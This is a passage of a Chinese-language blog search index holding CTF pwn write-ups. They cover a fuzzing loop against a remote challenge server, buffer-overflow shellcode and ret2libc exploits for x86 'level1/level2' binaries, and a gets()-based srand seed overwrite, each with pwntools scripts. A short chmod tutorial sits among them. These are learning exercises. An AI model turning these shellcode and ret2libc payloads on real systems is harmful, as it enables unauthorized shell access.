punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.200.240.241"</span><span class="token punctuation">,</span> <span class="token number">7000</span><span class="token punctuation">)</span>                fuzz<span class="token punctuation">(</span>r<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>                text <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'text.len='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'text='</span><span class="token operator">+</span>text<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'num='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' flag='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#except为空则try语句中出现任何错误都会执行r.close()</span>                r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>对于循环脚本可用ctr + c 打断无法继续下去的一个循环进行下一个循环</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP_x86</title>
      <link href="/2020/04/23/rop-x86/"/>
      <url>/2020/04/23/rop-x86/</url>
      
        <content type="html"><![CDATA[<h2 id="ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"><a href="#ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。" class="headerlink" title="ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"></a>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</h2><h3 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h3><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p><p>level1：无防护32位<br>ida伪代码：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>进入vulnerable（危险）函数：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>从char buf （后面的注释）这一段可知其大小大概为0x88+0x10.<br>下面的read函数256u表示允许读入256个字符，显然存在溢出。<br>进入buf：<br><img src="https://s1.ax1x.com/2020/05/23/YvkNbF.png" alt=""><br>所以（下面的没截下来）buf可放入0x88+0x8个字符（140），还可以通过调试进一步验证。</p><h3 id="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"><a href="#那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。" class="headerlink" title="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"></a>那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。</h3><h2 id="调试："><a href="#调试：" class="headerlink" title="调试："></a>调试：</h2><p>在read函数时制造200个字符：<br><img src="https://s1.ax1x.com/2020/05/23/Yvksv6.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkdUJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkWUH.png" alt=""><br>所以140个字符+ret返回地址即可</p><h3 id="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"><a href="#现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）" class="headerlink" title="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"></a>现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）</h3><p>由于各种玄学问题buf正真的地址不是我想的那样，这里我引用蒸米@阿里聚安全的原话：</p><pre><code>  对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</code></pre><p>解决方法：开启core dump功能。<br>指令：ulimit -c unlimited<br>   sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’</p><p>开启后，当运行程序出现内存错误时，系统会生成一个core dump文件在tmp目录下。然后我们用gdb查看该core文件，来推测buf真正的地址。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkRVe.png" alt=""><br>接下来调试core文件：<br><img src="https://s1.ax1x.com/2020/05/23/Yvk4PA.png" alt=""><br>下面这一步我不太明白为啥是$esp-144得到buf地址。个人觉得应该是-140，如果不正确可以扩大范围<br><img src="https://s1.ax1x.com/2020/05/23/Yvkf5d.png" alt=""><br>将这里的字符串和我们之前造的字符串对比是一致的。所以可以知道我们输入的字符串放在0xffffd000这里。所以buf地址就是0xffffd000.可以写exp了。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#level1</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level1"</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span> word_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">140</span><span class="token operator">-</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xffffcff0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)  ——这里启用的话可以进行调试。</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://s1.ax1x.com/2020/05/23/YvkgbD.png" alt=""><br>成功！！</p><h2 id="level2：NX开启，栈不可执行！"><a href="#level2：NX开启，栈不可执行！" class="headerlink" title="level2：NX开启，栈不可执行！"></a>level2：NX开启，栈不可执行！</h2><p>程序还是一样的就是在编译的时候开其NX保护机制。<br>那么像上面的方法将shellcode填入栈中，再用ret跳转到栈上执行shellcode的方法就不行了。</p><p>小知识：ps指令查看进程（注意pid）<br><img src="https://s1.ax1x.com/2020/05/23/YvkD81.png" alt=""><br>如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。<br><img src="https://s1.ax1x.com/2020/05/23/YvkcDO.png" alt=""></p><h3 id="接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）："><a href="#接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）：" class="headerlink" title="接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）："></a>接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）：</h3><h4 id="我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。"><a href="#我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。" class="headerlink" title="我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。"></a>我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</h4><p>步骤：<br>首先再main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中。<br>通过print system这个命令来获取system函数在内存中的位置。<br>通过print __libc_start_main这个命令获取libc.so在内存中的起始位置。<br>通过find命令查找/bin/sh这个字符串。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkBCR.png" alt=""><br>图中字符串/bin/sh有两个一个实在libc中的另一个是出题者给的hint（这个在ida中的字符串也可以找到）两个都可以用。<br>可以写exp了：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment" spellcheck="true">#xctfpwn6 == rop level2</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level2"</span><span class="token punctuation">)</span>systemaddr <span class="token operator">=</span> <span class="token number">0xf7e19d10</span>binshaddr <span class="token operator">=</span> <span class="token number">0x804a024</span>ret <span class="token operator">=</span> <span class="token number">0x804a024</span>   <span class="token comment" spellcheck="true">#要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们只需要执行system("/bin/sh")函数所以system的返回地址可任意。</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>systemaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>连接到端口时脚本为：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>  <span class="token operator">//</span>虽然不是很明白，但加上这个是有点用处的，可以显示一些细节。elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>“level2"<span class="token punctuation">)</span> <span class="token operator">//</span> elf只是一个名字，level2是本地文件。sysaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">//</span> <span class="token punctuation">.</span>symbols是用来搜寻函数的，此处搜寻system的地址（在本地文件了level2中搜寻）!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkrgx<span class="token punctuation">.</span>png<span class="token punctuation">)</span>binshaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">.</span>search 找字符串，汇编代码或者某个数值的地址。!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkw59<span class="token punctuation">.</span>png<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"******"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这里由ida字符串查看可知：<br><img src="https://s1.ax1x.com/2020/05/23/YvktDU.png" alt=""></p><p>本地文件里包括system与/bin/sh，所以在使用相关搜索功能时可以查询到。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF执行权限</title>
      <link href="/2020/04/23/elf-zhi-xing-quan-xian/"/>
      <url>/2020/04/23/elf-zhi-xing-quan-xian/</url>
      
        <content type="html"><![CDATA[<p>使用chmod命令：<br>chmod用于管理文件或目录的权限，文件或目录权限的控制分别以读取(r)、写入(w)、执行(x)3种<br>可读可写可执行，抽象的用二进制来表示 1 代表拥有该权限，0 代表没有该权限，这样我们就可以看到<br>具有全部权限二进制可理解为  “111”  即 十进制的 “7”，只有读写权限二进制可理解为  “100”  即 十进制的 “4”</p><p>用法：chmod [选项] [文件..]</p><p>权限范围<br>u,User　　　   即文件或目录的拥有者<br>g,Group　　　即文件或目录的所属群组<br>o,Other　　　 除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围<br>a,All　　　　   即全部的用户，包含拥有者，所属群组以及其他用户<br>r　　　　　　 读取权限，数字代号为“4” 即 “100”<br>w　　　　　　写入权限，数字代号为“2” 即 “010”<br>x　　　　　　 执行或切换权限，数字代号为“1” 即 “001”<br>-　　　　　　 不具任何权限，数字代号为“0” 即 “000”</p><p>&lt;权限范围&gt;+&lt;权限&gt;　　       　　  增加指定权限 (chmod u+r file)<br>&lt;权限范围&gt;-&lt;权限&gt;　　  　　　　删除指定权限 (chmod g-rw file)<br>&lt;权限范围&gt;=&lt;权限&gt;　　　　　　 等于指定权限 (chmod o=rwx file)</p><p>例子：<br><img src="https://s1.ax1x.com/2020/05/23/YjqWND.png" alt=""></p><p>将suanfa文件增加可执行</p>]]></content>
      
      
      <categories>
          
          <category> MASS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-gusnum</title>
      <link href="/2020/03/23/xctf-gusnum/"/>
      <url>/2020/03/23/xctf-gusnum/</url>
      
        <content type="html"><![CDATA[<p>1: file<br><img src="https://s1.ax1x.com/2020/05/23/YjOiQA.png" alt="64位"><br>2: checksec<br><img src="https://s1.ax1x.com/2020/05/23/YjOCzd.png" alt="保护全开"><br>3: 运行<br><img src="https://s1.ax1x.com/2020/05/23/YjLxIO.png" alt=""><br>4: ida伪代码<br><img src="https://s1.ax1x.com/2020/05/23/YjOpJe.png" alt=""><br>在用rand（）函数产生随机数时一般用srand（）初始化种子（seed）<br>rand函数调用<br>rand()函数每次调用前都会查询是否调用过srand(seed)，是否给seed设定了一个值，如果有那么它会自动调用srand(seed)一次来初始化它的起始值<br>若之前没有调用srand（seed），那么系统会自动给seed赋初始值，即srand（1）自动调用它一次</p><p>rand（）产生随机数时，如果用srand（seed）播下种子之后，一旦种子相同（下面的getpid方法），产生的随机数将是相同的。当然很多时候刻意让rand（）产生的随机数随机化，用时间作种子 srand（time（NULL）），这样每次运行程序的时间肯定是不相同的，产生的随机数肯定就不一样了。</p><p>从上面伪代码的解析可知：关键在于10次循环，每一次输入的值v4得等于随机数v6（1~6之间）就可以进入sub_C3E函数得到flag</p><p>gets函数：的v7：<br><img src="https://s1.ax1x.com/2020/05/23/YjLvdK.png" alt=""></p><p>可知v7大小0x30-0x10=0x20,下面就是seed这个sedd大小我没从stack中看出，在伪代码中定义的seed是unsigned int seed[2];<br> 大小为8个字节。<br>伪代码中srand用的是seed[0]所以如果能将seed[0]覆盖为以知就可以再写一个程序来得到rand的随机数（在linux中写）<br>得到随机数就能进入目标函数</p><p>尝试：<br>用0x20个字符填满v7后面加上0000，记住gets是将输入做当字符串，所以0000填满了seed[0]后因为seed是int型数据，里面的字符串以ASCII码存入会被直接解释为int数据即：0000的ASCII为0x30303030<br>所以seed的值为0x30303030，所以我们的代码seed值就是0x30303030：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0x30303030</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>   </code></pre><p>结果：</p><p><img src="https://s1.ax1x.com/2020/05/23/YjOSiD.png" alt=""></p><p>所以我们payload = “A”*0x20 + “0000”:<br><img src="https://s1.ax1x.com/2020/05/23/YjO9RH.png" alt=""></p><p>确实如此！！！！</p><p>写exp：</p><pre class=" language-python"><code class="language-python">rom pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"***"</span><span class="token punctuation">,</span><span class="token operator">**</span><span class="token operator">*</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">"0000"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>本地测试：<br><img src="https://s1.ax1x.com/2020/05/23/YjOFsI.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-easy </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
